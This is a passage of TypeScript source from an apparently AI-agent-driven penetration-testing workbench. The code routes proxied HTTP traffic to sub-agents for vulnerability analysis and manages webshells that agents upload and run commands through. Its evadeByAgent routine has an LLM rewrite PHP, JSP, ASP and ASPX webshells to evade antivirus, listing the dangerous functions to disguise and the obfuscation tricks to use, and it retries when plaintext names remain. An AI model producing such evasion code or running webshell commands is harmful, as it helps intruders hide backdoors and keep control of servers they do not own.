                return
              }
              await new Promise((r) => setTimeout(r, 120))
            }
          }
          pump()
        } catch (e) {
          reject(e)
        }
      }).catch(reject)
    })
  }

  /** 新流量入分析队列（消息队列：FIFO，逐个消费；入队即快照完整请求/响应报文） */
  private enqueueAnalyze(id: number, detail?: unknown, url?: string): void {
    if (this.analyzeMap.has(id)) return
    // HermesPentBox 自身产生的流量（WebShell / Repeater 等带 x-pentbox-source 标记）：直接跳过 Agent 审计（done + 跳过 icon）
    if (isPentboxOwnTraffic(detail)) {
      this.analyzeMap.set(id, { state: 'done', vuln: false, builtin: true, detail, url })
      return
    }
    // 浏览器自带流量（更新/字典/遥测/OCSP）：不送 Agent 直接 done（跳过 icon），不占 Hermes 队列
    if (isBrowserBuiltin(detail, url)) {
      this.analyzeMap.set(id, { state: 'done', vuln: false, builtin: true, detail, url })
      return
    }
    // 错误状态码：404（资源不存在）与 5xx（服务器错误）无 bypass 价值 → 跳过 Agent（done + 跳过 icon）
    // 401/403/407 等 40x 保留（可做 bypass 分析，必须发 Agent）
    // st===0（连接失败/无响应报文，如 CONNECT 隧道、代理 502 错误）：无响应内容可分析 → 同样跳过
    const st = resStatus(detail)
    if (st === 0 || st === 404 || st >= 500) {
      this.analyzeMap.set(id, { state: 'done', vuln: false, skipped: true, detail })
      return
    }
    // 渗透执行窗口内的流量：子 Agent 自己的渗透请求 → 直接跳过（不再用子 Agent 审计，防循环）
    // 判定：渗透窗口（penetrating）|| 流量目标命中进行中渗透的目标（Host+路径，防渗透前已排队/窗口边缘的漏网流量）
    const inPenetrate = this.penetrating || (() => {
      const u = url || ''
      for (const t of this.penetrateTargets.values()) {
        const key = (t || '').split(' ')[0]
        if (key && u.includes(key)) return true
      }
      return false
    })()
    if (inPenetrate) {
      this.analyzeMap.set(id, { state: 'done', vuln: false, skipped: true, penetrate: true, detail, url })
      return
    }
    // 全自动模式：无流量分析（子 Agent 不参与）——纯 /pentest {domain} 指令驱动主 Agent 渗透；流量照常捕获展示但不送子 Agent
    if (this.pentestMode === 'auto') {
      this.analyzeMap.set(id, { state: 'done', vuln: false, skipped: true, autoSkip: true, detail, url })
      return
    }
    this.analyzeMap.set(id, { state: 'queued', detail, url })
    this.analyzeQueue.push(id)
    // 站点地图同步到 Neo4j：进入审计的流量（非 builtin/self/404/5xx/渗透）≡ 站点地图可见项 → 写 Host-Api 节点（图上下文供 Agent 直接看到站点地图）
    // 去重 key 含项目域：切换项目后同 URL 需重新同步到新项目域
    const syncKey = `${this.graph.projectKey}|${url}`
    if (url && !this.graphApiSynced?.has(syncKey)) {
      const d = detail as { reqLine?: string } | undefined
      const line = String(d?.reqLine || '')
      const m = line.match(/^(\S+)\s+(\S+)/)
      const host = this.hostOf(url) || url  // 统一无协议 host:port（与分析/凭据/漏洞写入同格式，避免 Host 节点分裂）
      let path = m ? m[2] : ''
      // 代理请求行可能是绝对 URI（curl/浏览器走代理：GET http://host/path HTTP/1.1）→ 归一为相对路径
      if (path.startsWith('http')) { try { const pu = new URL(path); path = pu.pathname + pu.search } catch { /* 保持原样 */ } }
      if (!path) path = url.replace(/^https?:\/\/[^/]+/i, '') || '/'
      const method = m ? m[1] : 'GET'
      // 仅写入成功才标记已同步（失败不标记 → 后续同 URL 流量自动重试；避免 Neo4j 抖动导致站点地图条目永久丢失）
      this.graph.upsertHostApi(host, path, method)
        .then(() => {
          if (this.graphApiSynced.size > 5000) this.graphApiSynced.clear()  // 防无限增长（重启即清，Neo4j 侧 MERGE 幂等）
          this.graphApiSynced.add(syncKey)
        })
        .catch(() => { /* 图写入失败：不标记，下次同 URL 流量再试 */ })
    }
  }

  // （resStatus / BROWSER_TRAFFIC / LOCAL_ARTIFACT_RE / STATIC_RESOURCE_RE / isBrowserBuiltin / isPentboxOwnTraffic / extractJson / normalizeTargetKey 已提取至 core/utils.ts）

  // ---------------- 本地 Hermes 分析器（CLI 子进程；独立档案 HermesPentBox + 10 槽会话负载均衡） ----------------
  private hermesCli = join(homedir(), 'AppData', 'Local', 'hermes', 'hermes-agent', 'venv', 'Scripts', 'hermes.exe')
  /** HermesPentBox 独立档案目录（SOUL.md 猎隼 persona + memories/user.md 用户画像；所有会话落此档案） */
  private hermesHome = join(homedir(), 'AppData', 'Local', 'hermes', 'profiles', 'hermespentbox')
  /** spawn 时注入 HERMES_HOME → 分析/对话会话都在 HermesPentBox 档案之下；HTTP(S)_PROXY 指向本应用代理（子 Agent 渗透流量必须经过应用——动态跟随监听 IP：自定义 IP 时用该 IP，0.0.0.0 用 127.0.0.1 回环，否则代理只绑自定义 IP 时回环连不上、渗透流量丢失），NO_PROXY 排除模型 API 域名（模型调用直连不走代理）；TMPDIR/TEMP/TMP + cwd 指向系统临时目录（Agent 所有临时文件落临时目录，不污染工作目录） */
  private get hermesEnv(): NodeJS.ProcessEnv {
    const ip = this.host && this.host !== '0.0.0.0' ? this.host : '127.0.0.1'
    const proxyPort = this.opts.proxyPort ?? 8899
    return {
      ...process.env,
      HERMES_HOME: join(homedir(), 'AppData', 'Local', 'hermes', 'profiles', 'hermespentbox'),
      HTTP_PROXY: `http://${ip}:${proxyPort}`,
      HTTPS_PROXY: `http://${ip}:${proxyPort}`,
      NO_PROXY: 'api.minimaxi.com,api.deepseek.com,localhost',
      no_proxy: 'api.minimaxi.com,api.deepseek.com,localhost',
      TMPDIR: tmpdir(),
      TEMP: tmpdir(),
      TMP: tmpdir(),
    }
  }
  /** Agent spawn 统一工作目录：系统临时目录（临时文件不落项目目录） */
  private agentCwd = tmpdir()
  /** 渗透执行窗口：期间经代理的流量直接标记跳过（不再次送子 Agent 审计，防循环） */
  private penetrating = false

  /** 流量分析子 Agent 独立档案（hermespentbox-analyzer）：审计员 persona + 用户画像 + 红队技能库，与主档案的「猎隼」角色分离 */
  private analyzerHome = join(homedir(), 'AppData', 'Local', 'hermes', 'profiles', 'hermespentbox-analyzer')

  /** 渗透审批 Agent 独立档案（hermespentbox-approver）：审批官 persona（只判断安全合规，禁止破坏性操作） */
  private approverHome = join(homedir(), 'AppData', 'Local', 'hermes', 'profiles', 'hermespentbox-approver')

  /** 确保独立档案存在：无 hermespentbox 档案则自动创建（clone 配置保留模型）并写入猎隼 persona + 用户画像 */
  private async ensureHermesProfile(): Promise<void> {
    try {
      if (existsSync(join(this.hermesHome, 'SOUL.md'))) { this.ensureSkills(this.hermesHome); return }  // 档案已就绪，兜底补技能库
      console.log('[pentbox] hermespentbox 档案不存在，自动创建…')
      await new Promise<void>((resolve) => {
        const child = spawn(this.hermesCli, ['profile', 'create', 'hermespentbox', '--clone'], { env: this.hermesEnv, cwd: this.agentCwd, windowsHide: true })
        child.on('close', () => resolve())
      })
      mkdirSync(this.hermesHome, { recursive: true })
      writeFileSync(join(this.hermesHome, 'SOUL.md'), SOUL_PERSONA)
      mkdirSync(join(this.hermesHome, 'memories'), { recursive: true })
      writeFileSync(join(this.hermesHome, 'memories', 'user.md'), USER_PROFILE)
      this.ensureSkills(this.hermesHome)  // 档案就绪后立即复制技能库（不再盲等 setTimeout）
      console.log('[pentbox] hermespentbox 档案创建完成（SOUL.md + memories/user.md）')
    } catch (e) {
      console.error('[pentbox] 档案创建失败:', String(e).slice(0, 200))
    }
  }

  /** 确保流量审计员档案（hermespentbox-analyzer）存在：审计员 persona + 用户画像 + 红队技能库（分析判断需识别攻击手法） */
  private async ensureAnalyzerProfile(): Promise<void> {
    try {
      if (existsSync(join(this.analyzerHome, 'SOUL.md'))) { this.ensureSkills(this.analyzerHome); return }  // 已就绪，兜底补技能库
      console.log('[pentbox] hermespentbox-analyzer 档案不存在，自动创建…')
      await new Promise<void>((resolve) => {
        const child = spawn(this.hermesCli, ['profile', 'create', 'hermespentbox-analyzer', '--clone'], { env: this.hermesEnv, cwd: this.agentCwd, windowsHide: true })
        child.on('close', () => resolve())
      })
      mkdirSync(this.analyzerHome, { recursive: true })
      writeFileSync(join(this.analyzerHome, 'SOUL.md'), SOUL_ANALYZER)
      mkdirSync(join(this.analyzerHome, 'memories'), { recursive: true })
      writeFileSync(join(this.analyzerHome, 'memories', 'user.md'), USER_PROFILE)
      this.ensureSkills(this.analyzerHome)  // 档案就绪后立即复制技能库
      console.log('[pentbox] hermespentbox-analyzer 档案创建完成（审计员 SOUL + user.md + 技能库）')
    } catch (e) {
      console.error('[pentbox] 审计员档案创建失败:', String(e).slice(0, 200))
    }
  }

  /** 确保渗透审批官档案（hermespentbox-approver）存在：审批官 persona + 用户画像 + 红队技能库（审批判断需识别渗透手法） */
  private async ensureApproverProfile(): Promise<void> {
    try {
      if (existsSync(join(this.approverHome, 'SOUL.md'))) { this.ensureSkills(this.approverHome); return }  // 已就绪，兜底补技能库
      console.log('[pentbox] hermespentbox-approver 档案不存在，自动创建…')
      await new Promise<void>((resolve) => {
        const child = spawn(this.hermesCli, ['profile', 'create', 'hermespentbox-approver', '--clone'], { env: this.hermesEnv, cwd: this.agentCwd, windowsHide: true })
        child.on('close', () => resolve())
      })
      mkdirSync(this.approverHome, { recursive: true })
      writeFileSync(join(this.approverHome, 'SOUL.md'), SOUL_APPROVER)
      mkdirSync(join(this.approverHome, 'memories'), { recursive: true })
      writeFileSync(join(this.approverHome, 'memories', 'user.md'), USER_PROFILE)
      this.ensureSkills(this.approverHome)  // 档案就绪后立即复制技能库
      console.log('[pentbox] hermespentbox-approver 档案创建完成（审批官 SOUL + user.md + 技能库）')
    } catch (e) {
      console.error('[pentbox] 审批官档案创建失败:', String(e).slice(0, 200))
    }
  }

  /** 确保内置红队技能库就位（复制到指定档案）：skills 无 hacker-* 技能时，从应用内置 assets/hack-skills 复制（102 个技能） */
  private ensureSkills(home = this.hermesHome): void {
    try {
      const dst = join(home, 'skills')
      // 已就位判定：技能位于类别子目录下（如 skills/web-injection/hacker-sqli-sql-injection）
      if (existsSync(join(dst, 'web-injection', 'hacker-sqli-sql-injection'))) return
      const src = join(process.cwd(), 'assets', 'hack-skills')
      if (!existsSync(src)) { console.warn('[pentbox] 内置技能库缺失:', src); return }
      const { cpSync } = require('node:fs') as typeof import('node:fs')
      mkdirSync(dst, { recursive: true })
      cpSync(src, dst, { recursive: true })
      console.log(`[pentbox] 内置红队技能库已就位（102 技能 → ${home}）`)
    } catch (e) {
      console.error('[pentbox] 技能库复制失败:', String(e).slice(0, 200))
    }
  }
  /** 本地 Hermes 在线状态（后端每 5s 探测，供 UI 实时刷新 HERMES AGENT 状态） */
  private hermesOnline = false
  private probeHermes(): void {
    // 工作台 Agent 功能（对话/分析/渗透/steer）依赖自研 Agent Bridge（28766）+ hermes CLI。
    // 状态正确判定：CLI 存在 && bridge 可连 → active；否则 offline。
    if (!existsSync(this.hermesCli)) { this.hermesOnline = false; return }
    let done = false
    const set = (v: boolean) => { if (!done) { done = true; this.hermesOnline = v } }
    // 探测自研 Agent Bridge 端口（对话/分析/渗透/steer 实际依赖）
    const s = connect({ host: '127.0.0.1', port: this.bridgePort, timeout: 800 })
    s.once('connect', () => {
      s.destroy(); set(true)
      // 端口可达但非本实例 spawn → 上次崩溃残留的 bridge：清理重建（保证 bridge 始终自管，杜绝复用异常状态）
      if (!this.bridgeProc && !this.bridgeReady) this.rebuildStaleBridge()
    })
    s.once('error', () => s.destroy())
    s.once('timeout', () => s.destroy())
    s.setTimeout(800)
    // 探测失败 → offline；同时若 CLI 存在且 bridge 未运行，触发一次拉起（ensureBridge 幂等）
    setTimeout(() => {
      if (done) return
      set(false)
      this.ensureBridge().catch((e) => console.warn('[pentbox] bridge 拉起失败:', String(e).slice(0, 100)))
    }, 900)
  }
  private hermesSessionId: string | null = null
  private hermesBusy = false
  /** 10 个子 Agent 独立会话槽（并行分析互不干扰；每槽 --resume 各自累积上下文） */
  private analyzeSlots: (string | null)[] = new Array(ApiServer.MAX_PARALLEL).fill(null)
  /** 每槽当前 in-flight 数（负载均衡：新流量分给最空闲的子 Agent，最少连接算法） */
  private slotBusy: number[] = new Array(ApiServer.MAX_PARALLEL).fill(0)
  /** 进行中的渗透子 Agent 进程（slot → child，供 /api/penetrate/cancel 杀进程） */
  private penetrateChildren = new Map<number, ReturnType<typeof spawn> | (() => void)>()

  // ---------------- 图变更实时广播（Neo4j 写入 → steer 注入所有运行中的 Agent 会话） ----------------
  /** 2 秒节流窗口内待广播的图变更摘要（合并多条为一条，防刷屏） */
  private graphBroadcastBuf: string[] = []
  private graphBroadcastTimer: ReturnType<typeof setTimeout> | null = null
  /** 图写入成功后调用：记录变更摘要并节流广播到主 Agent + 全部子 Agent 槽（仅运行中会话接收，空闲自动 rejected） */
  private broadcastGraphChange(summary: string): void {
    if (!this.bridgeReady) return
    this.graphBroadcastBuf.push(summary)
    if (this.graphBroadcastBuf.length > 8) this.graphBroadcastBuf.shift()  // 单窗口最多 8 条，防上下文刷爆
    if (this.graphBroadcastTimer) return
    this.graphBroadcastTimer = setTimeout(() => {
      this.graphBroadcastTimer = null
      const batch = this.graphBroadcastBuf.splice(0)
      if (!batch.length) return
      const text = `（图实时更新）Neo4j 情报图刚新增以下条目，供你更新认知（无需回复，勿中断当前工作）：\n${batch.join('\n')}`
      // 主 Agent 会话用主档案（hermespentbox）；分析槽会话在审计员档案（hermespentbox-analyzer）——profile 必须匹配，否则 broker 找不到对应会话
      if (this.chatSessionId) {
        this.bridge.steer(this.chatSessionId, text, 'hermespentbox').catch((e) => console.warn('[pentbox] 图变更广播 steer 失败:', String(e).slice(0, 100)))
      }
      for (const sid of this.analyzeSlots) {
        if (sid) this.bridge.steer(sid, text, 'hermespentbox-analyzer').catch((e) => console.warn('[pentbox] 图变更广播 steer 失败:', String(e).slice(0, 100)))
      }
    }, 2000)
  }

  /** 与本地 Hermes 对话（异步 spawn；独立会话——分析 10 槽并行时共享会话会锁冲突导致进程崩溃；回复过滤 CLI 日志） */
  private chatSessionId: string | null = null
  /** 主对话历史（Hermes Agent 聊天框；项目级，随项目快照持久化/恢复；上限条数防膨胀） */
  private chatHistory: { role: 'user' | 'ai'; text: string; ts: number }[] = []
  private static readonly CHAT_HISTORY_CAP = 500
  /** 通用 hermes 单轮调用：resume 指定会话（可空=新会话），onSid 回调拿到新会话 id，onSpawn 回调拿到子进程（供取消杀进程），tailLines 控制回复截断行数（VULNDOC 需放宽） */
  private runHermes(message: string, resume?: string | null, onSid?: (sid: string) => void, onSpawn?: (child: ReturnType<typeof spawn>) => void, tailLines = 12): Promise<string> {
    const args = ['chat', '-q', message, '-Q', '--source', 'pentbox-chat']
    if (resume) args.push('--resume', resume)
    return new Promise((resolve) => {
      const child = spawn(this.hermesCli, args, { timeout: 240000, env: this.hermesEnv, cwd: this.agentCwd, windowsHide: true })
      onSpawn?.(child)
      let out = ''
      child.stdout.on('data', (b) => { out += b })
      child.stderr.on('data', (b) => { out += b })
      child.on('error', (e) => resolve(`（Agent 进程启动失败：${e.message}）`))
      child.on('close', () => {
        const sid = out.match(/session_id:\s*(\S+)/)?.[1]
        if (sid) onSid?.(sid)
        // 回复 = 输出尾部（去 CLI 日志/session_id 行）；空输出给明确错误（不静默"（无回复）"）
        const clean = out.split('\n').filter((l) => !/session_id:\s*\S+/.test(l)).join('\n').trim()
        if (!clean) { resolve('（Agent 无响应：进程无输出，可能模型端点不可达 / API Key 无效 / 请求超时）'); return }
        const tail = clean.split('\n').slice(-tailLines).join('\n')
        resolve(tail.length > 6000 ? tail.slice(-6000) : tail)
      })
    })
  }
  /** 应用工具能力引导（注入主聊天）：Agent 可直接主动调用这些 HTTP 接口（执行接口已由应用封装） */
  private toolsHint(): string {
    const ws = this.webshells
    const lines: string[] = [
      '【应用工具能力】以下接口是工作台提供的 Agent 直连能力，你可主动调用（execute_code 里用 python urllib，或 terminal 用 curl），不必等用户代为操作：',
      '· 主动查全局情报图（站点地图/漏洞/凭据/WebShell/每接口分析结论，多 Agent 共享）：GET http://localhost:8877/api/graph/query （文本）；加 ?format=json 得结构化 JSON（含 analysis 结论）；加 ?host=192.168.6.133:8080 只看该主机',
      '· 查看当前流量面板（应用代理实时捕获的 HTTP 流量：方法/URL/状态码/时间）：GET http://localhost:8877/api/flows?limit=30 ；加 &full=1 返回最近请求的完整请求/响应报文',
      '· 主动记录情报到图（共享给其他 Agent，非破坏性）：POST http://localhost:8877/api/graph/note ，body={"host":"192.168.6.133:8080","path":"/x.php","text":"发现内容","level":"high|medium|low|info"}',
      '· 登录凭据等敏感信息：同样用 /api/graph/note 记录（text 含 用户名/密码/令牌），level 标 high',
    ]
    if (ws.length) {
      lines.push(`· WebShell 管理（当前 ${ws.length} 个）：命令执行 POST http://localhost:8877/api/webshells/exec ，body={"id":N,"command":"cmd"} → {"ok":true,"output":"..."}（加解密握手已封装，密钥勿自行构造）`)
      for (const w of ws.slice(0, 10)) lines.push(`   id=${w.id} | ${w.url} | ${w.type || 'behinder'}/${w.script || '?'} | ${w.status || 'unknown'} | pass=${w.password ? '***' : '(空)'} key=${w.key ? '***' : '(空)'}`)
    }
    lines.push('约束：以上接口仅用于读取情报、记录分析结论与执行命令；删除/覆盖现有数据属破坏性操作，须先征得用户同意。')
    return lines.join('\n') + '\n\n'
  }

  /** 子 Agent（流量分析槽）精简工具引导：分析中可主动查/写图（完整工具列表见主聊天 toolsHint） */
  private static readonly SUB_TOOL_HINT = '【图工具】你可主动调 http://localhost:8877/api/graph/query（?format=json 得结构化，?host= 过滤主机）查全局情报图；发现需共享的情报用 POST /api/graph/note {"host":"..","path":"..","text":"..","level":"..."} 记录（凭据/敏感信息 level 标 high）。若上传了 WebShell，必须 POST /api/webshells 同步到应用（body={"type":"godzilla|behinder|antSword","script":"php|jsp|asp|aspx","url":"..","password":"..","key":"..","cryption":"xor|aes"}，同步后自动入图）。仅读取与记录，禁止删改。\n\n'

  private hermesChat(message: string, gctx?: string, hint?: string): Promise<string> {
    const mid = [gctx, hint].filter(Boolean).join('\n')
    const input = mid ? `${mid}【用户消息】${message}` : message
    // 统一走 Agent Bridge 通道（与流式聊天同一命名空间/会话指针），避免 CLI runHermes 的 session_id 污染 chatSessionId
    return this.bridgeAsk(input, this.chatSessionId, {
      onDone: (sid) => { this.chatSessionId = sid },
    }, true)
  }

  /** 独立 Agent 免杀：交给 LLM 对原始 WebShell 代码做语义等价混淆（覆盖 PHP/JSP/ASPX/ASP 所有可生成语言），确保正常上线 */
  private async evadeByAgent(code: string, script: string): Promise<string> {
    const guide: Record<string, { funcs: string; strings: string; methods: string; tips: string }> = {
      php: {
        funcs: 'eval、assert、base64_decode、call_user_func、file_get_contents、session_start、strlen、strpos、openssl_decrypt、explode、system、exec、shell_exec、passthru、str_rot13、gzinflate',
        strings: 'php://input、getBasicsInfo、aes-128-ecb、shell',
        methods: '字符串拼接（"base64_"+"decode"）、hex 转义（双引号内反斜杠后跟两位十六进制表示一个字符，如反斜杠x65=字母e）、变量函数、str_rot13/gzinflate 组合',
        tips: 'PHP 的 hex 转义必须用双引号包裹（单引号不解析反斜杠x），禁止用单引号写反斜杠xNN',
      },
      jsp: {
        funcs: 'Runtime.getRuntime().exec、ProcessBuilder、Class.forName、ClassLoader.loadClass、getMethod、invoke、newInstance、defineClass',
        strings: 'cmd.exe、/bin/sh、/bin/bash、powershell.exe、java.lang.Runtime、javax.script',
        methods: '字符串拼接（"Run"+"time"）、Class.forName 反射（getMethod+invoke）、new String(new char[]{...}) 字符数组构造类名/方法名、base64 解码后反射',
        tips: 'Java 的类名/方法名用字符串拼接或 char 数组构造，配合 Class.forName + getMethod + invoke 反射调用',
      },
      aspx: {
        funcs: 'System.Diagnostics.Process、ProcessStartInfo、Assembly.Load、Type.GetType、Activator.CreateInstance',
        strings: 'cmd.exe、/c、powershell、System.Diagnostics.Process、System.Net.WebClient',
        methods: '字符串拼接（"System."+"Diagnostics."+"Process"）、Type.GetType 反射 + Activator.CreateInstance、new string(new char[]{...}) 字符数组、Convert.FromBase64String',
        tips: 'C# 的命名空间/类型名用字符串拼接或反射（Type.GetType / Activator.CreateInstance）构造',
      },
      asp: {
        funcs: 'execute、executeGlobal、Server.CreateObject、WScript.Shell、eval、GetObject、Scripting.FileSystemObject',
        strings: 'WScript.Shell、cmd.exe、/c、Scripting.FileSystemObject',
        methods: '字符串拼接（& 连接）、Chr() 函数逐字符构造（Chr(87)&Chr(83)...）、execute 拆拼',
        tips: 'VBScript 的敏感对象名/命令用 Chr() 函数逐字符构造（如 Chr(87)&Chr(83)&Chr(99)...）或字符串拼接',
      },
    }
    const g = guide[script] || guide.php
    const prompt = `【WebShell 免杀任务】下面这段是 ${script} 代码，你必须输出 ${script} 代码的免杀混淆版本（严格保持 ${script} 语言不变，禁止改成 Python/Java/C#/VBScript 等其他语言）。要求：
0. 禁止调用任何工具（execute_code / write_file / terminal 等）、禁止写文件、禁止创建文件——你的回复文本本身必须就是完整代码，第一个字符就是代码的开头（如 < 或 ?），禁止任何前置解释/后置说明；
1. 敏感函数/类名必须用语言特性分割拼接，禁止明文出现（含未使用代码）：${g.funcs} 等 → ${g.methods}；
2. 敏感字符串同样编码混淆：${g.strings} 等；
3. 变量名/类名/方法名随机化；
4. 【最关键】严格逐语句对应原始代码，只做表面混淆（函数名/类名/字符串/变量名替换），禁止增删任何语句、禁止改变执行顺序、禁止改变调用链——原始代码的每一层调用（如解码后执行）缺一不可；
5. 只输出最精简的等价代码，禁止生成任何冗余/未使用的变量、闭包、辅助类；
6. 只输出混淆后的完整代码，禁止任何解释文字、禁止 markdown 代码块围栏（\`\`\`）。
${g.tips}

原始代码：
${code}`
    let sid: string | null = null
    const ask = (p: string) => this.bridgeAsk(p, sid, { onDone: (s) => { sid = s } })
    // 清理 Agent 输出：去 markdown 围栏 + 从代码开头截取（去前置解释）+ 截断到最后一个代码结束符（去后置错误/解释）
    const clean = (s: string): string => {
      s = s.replace(/```[a-zA-Z]*\n?/g, '')
      const start = s.search(/<\?php|<%[!@=]?|<\?/i)
      if (start > 0) s = s.slice(start)
      const ends = [...s.matchAll(/(%>|\?>)/g)]
      if (ends.length) { const last = ends[ends.length - 1]; s = s.slice(0, last.index! + last[0].length) }
      return s.trim()
    }
    let out = clean(await ask(prompt))
    // 校验：明文敏感函数/类名残留 → 同会话重试一次（Agent 输出不稳定，死代码里的明文同样降低免杀）
    const plainRe = /\b(eval|assert|base64_decode|call_user_func|execute|Runtime\.getRuntime|ProcessBuilder|Class\.forName|System\.Diagnostics\.Process|Server\.CreateObject)\b/
    if (plainRe.test(out)) {
      // 重试自带完整上下文（原始代码 + 上一版输出），不依赖会话记忆——bridge 会话续传可能丢上下文
      const retryPrompt = `上一版你输出的免杀代码仍残留明文敏感函数/类名，请重新输出。下面是原始代码和上一版输出，请严格确保：所有敏感函数名/类名（含未使用代码中）都用语言特性分割拼接、严格保持 ${script} 语言、删除所有冗余/未使用的变量与闭包，只输出最终完整代码（禁止解释文字、禁止 markdown 代码块围栏）。

【原始代码】
${code}

【上一版输出（含明文敏感函数，需修正）】
${out}`
      out = clean(await ask(retryPrompt))
    }
    return out
  }
  /** 调本地 Hermes 分析一条流量（Agent Bridge 并行会话，不阻塞主进程）：每槽独立 bridge 会话续传上下文；返回含 slot（提出意见的子 Agent 槽位） */
  private async hermesAnalyze(detail: unknown): Promise<{ vuln: boolean; level: string; sensitive: { type: string; value: string; level: string }[]; advice: string; slot: number }> {
    const d = (detail ?? {}) as Record<string, unknown>
    const digest = await this.digestPrompt()
    // 被动模式：点到为止——只需证明漏洞存在性，不深入利用分析
    const depthNote = this.pentestMode === 'passive' ? '\n（被动模式：点到为止——只需判断并证明漏洞存在性即可（注入点/未授权/敏感信息可读），不要给出完整利用链、不要深入利用分析）' : ''
    const prompt = digest + ApiServer.SUB_TOOL_HINT + depthNote + '分析以下 HTTP 流量（完整请求/响应）：\n1. 判断是否存在可利用的安全漏洞；\n2. 从报文中提取敏感信息/指纹/线索，type 必须从以下 HaENet 标签清单中精确选择（每个 type 自带固定危害等级；清单外的 type 禁止使用）：\n' + haeTagList() + '\n3. 若存在可利用漏洞（vuln=true），输出渗透意见 advice，格式必须为："经 Hermes 分析 <完整URL（协议+Host+完整路径+参数）> 可进行 <攻击方式> 渗透（<具体验证方式>），是否进行"。要求：攻击方式用具体手法（SQL 注入/未授权访问/SSRF/暴力破解/越权等）；具体验证方式必须写明用什么请求/payload 验证、预期证据（如"用 UNION SELECT 1,2 验证注入点存在"、"直接 GET 接口返回敏感数据"），并说明属只读验证不修改数据——审批官将依据这些信息做安全判断，信息不足会被拒绝。注意：vuln=true 时 advice 必填，禁止输出空字符串。\n4. 结合【全局情报】去重：若情报中该 Host+完整路径+渗透方式已标记为已渗透过/正在渗透/已确认漏洞，则不要重复建议同一渗透（vuln 判定参考已有结论），改分析该流量的新增风险面；同目标的其他接口不受影响，正常分析。\n只输出一行 JSON，格式：{"vuln": true或false, "level": "high|medium|low|info", "sensitive": [{"type": "标签名", "value": "值"}], "advice": "渗透意见或空"}。level 为整体危害等级。无漏洞时 advice 为空字符串。\n\n【请求】\n' +
      `${d.reqLine ?? ''}\n${((d.reqRawHeaders as string[]) ?? []).join('\n')}\n\n${d.reqBody ?? ''}\n\n【响应】\n${d.resLine ?? ''}\n${((d.resRawHeaders as string[]) ?? []).join('\n')}\n\n${String(d.resBody ?? '').slice(0, 4000)}`
    // 负载均衡：选当前最空闲的子 Agent 槽（最少连接算法），而非静态轮转
    // 渗透中的槽 + 已提出渗透意见卡待决策的槽 不接新流量分析（Agent 专注渗透/等待决策；取消/完成/卡片关闭后再恢复分配）
    const busy = this.slotBusy.map((v, i) => (this.penetrateTargets.has(i) || this.pendingAdviceSlots.has(i) ? Infinity : v))
    const slot = busy.indexOf(Math.min(...busy))
    this.slotBusy[slot]++
    const sid = this.analyzeSlots[slot]  // bridge 会话 id（首次 null → 自动新建）
    // 流量分析子 Agent 走独立审计员档案（hermespentbox-analyzer：审计员 persona + 红队技能库），与主 Agent 猎隼角色分离
    return this.bridgeAsk(prompt, sid, {
      onDone: (newSid) => { this.analyzeSlots[slot] = newSid },
    }, false, 'hermespentbox-analyzer').then((out) => {
      this.slotBusy[slot]--
      const p = extractJson(out)
      const sens: { type: string; value: string; level: string }[] = Array.isArray(p?.sensitive) ? p.sensitive.filter((s: unknown) => s && typeof s === 'object' && (s as { value?: unknown }).value != null).map((s) => {
        const rawType = String((s as { type?: unknown }).type ?? 'All URL')
        // HaENet 标签归一：精确命中注册表 → type 用注册表 key；未命中尝试大小写/别名模糊匹配；仍不中 → 保留原样（前端灰显）
        // 注意：HAE_TAGS[key] 返回 meta 对象（level/group/color），不能当作 type 用
        const exactKey = Object.prototype.hasOwnProperty.call(HAE_TAGS, rawType.trim()) ? rawType.trim() : null
        const tag = exactKey || Object.keys(HAE_TAGS).find((k) => k.toLowerCase() === rawType.trim().toLowerCase())
        const meta = (tag && HAE_TAGS[tag]) || null
        return { type: tag || rawType.trim(), value: String((s as { value?: unknown }).value).slice(0, 200), level: meta?.level ?? 'info' }
      }) : []
      const lvRaw = p?.level
      const overall: string = typeof lvRaw === 'string' && (['high', 'medium', 'low', 'info'] as string[]).includes(lvRaw) ? lvRaw : 'info'
      // 整体等级提升：任一标签等级高于模型输出的 overall 时以标签等级为准（HaENet fixed-level 兜底模型低估）
      const maxTag = sens.reduce((m, s) => (['high', 'medium', 'low', 'info'].indexOf(s.level) < ['high', 'medium', 'low', 'info'].indexOf(m) ? s.level : m), overall)
      let advice = p && typeof p.advice === 'string' && p.advice ? p.advice.slice(0, 300) : ''
      // 兜底：模型判有漏洞但 advice 空（输出不稳定）→ 用请求路径生成渗透意见（保证意见卡出现）
      if (p?.vuln && !advice) {
        const pm = String(d.reqLine ?? '').match(/\S+\s+(\S+)/)
        advice = `经 Hermes 分析 ${pm ? pm[1] : '目标'} 可进行 安全测试 渗透，是否进行`
      }
      // 本机工件/客户端噪音过滤：分析里的"敏感项"若是本机信息或标准请求头，不是目标泄漏 → 剔除（避免脏情报入图）
      const clean = sens.filter((s) => !LOCAL_ARTIFACT_RE.test(s.value) && !LOCAL_ARTIFACT_RE.test(s.type))
      if (clean.length !== sens.length) console.log(`[analyze] 过滤本机/客户端噪音敏感项 ${sens.length - clean.length} 条`)
      return { vuln: p ? !!p.vuln : false, level: maxTag, sensitive: clean, advice, slot }
    }).catch((e) => {
      this.slotBusy[slot]--
      throw e
    })
  }

  /** 从 URL 提取 host（含端口），用于按目标关联情报 */
  private hostOf(url: string): string {
    try { return new URL(url).host } catch { return '' }
  }

  /** 写入全局情报（持久条目不淘汰；滚动条目仅保留最近 20 条非持久流水；标签元数据随条目落图） */
  private pushDigest(entry: DigestEntry): void {
    // 写 Neo4j 情报图（会话内容共享核心）
    if (this.graph.enabled) {
      const host = entry.host || ''
      const path = entry.path || ''
      if (entry.kind === 'cred') {
        this.graph.writeCred({ type: entry.data.split(':')[0] || 'unknown', value: entry.data.split(':').slice(1).join(':') || entry.data, host, path, source: 'agent', tag: entry.tag, group: entry.group, level: entry.level, color: entry.color }).catch((e) => console.warn('[pentbox] 凭据入图失败:', String(e).slice(0, 100)))
        this.broadcastGraphChange(`新凭据 [${entry.tag || entry.data.split(':')[0] || '?'}](${entry.level || 'high'}) ${host}${path}: ${String(entry.data.split(':').slice(1).join(':') || '').slice(0, 60)}`)
      }
      else if (entry.kind === 'penetrating' || entry.kind === 'penetrated' || entry.kind === 'cancelled') {
        const method = (entry.data.match(/渗透（(.+)）/) || [])[1] || ''
        this.graph.writePenetration({ host, path, method, status: entry.kind === 'penetrating' ? 'penetrating' : entry.kind === 'cancelled' ? 'cancelled' : 'penetrated' }).catch((e) => console.warn('[pentbox] 渗透状态入图失败:', String(e).slice(0, 100)))
        this.broadcastGraphChange(`渗透状态 ${entry.kind}: ${host}${path}（${method || '?'}）— ${entry.data.slice(0, 80)}`)
      }
      else {
